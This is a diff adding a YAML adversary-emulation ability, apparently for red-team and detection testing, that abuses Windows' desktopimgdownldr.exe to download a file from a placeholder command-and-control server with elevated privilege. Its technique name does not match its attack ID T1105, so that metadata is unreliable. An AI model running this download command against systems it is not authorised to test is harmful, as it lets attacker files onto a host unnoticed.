@@ -1,0 +1,22 @@
+- id: 98958c23-8c70-1237-c4ed-028ea4e509ec
+  name: Desktopimgdownldr.exe - Downloads the file and sets it as the computer's lockscreen
+  description: Downloads the file and sets it as the computer's lockscreen
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe
+          /lockscreenurl:#{server}/file/download /eventName:desktopimgdownldr
+  singleton: false
+  privilege: Elevated
+  repeatable: true
+  buckets:
+  - command-and-control
+  version: '1.0'
+  author: Gal Kristal
+  created: '2020-06-28'
+  modified: '2020-06-28'
+  operating_system: Windows All Versions
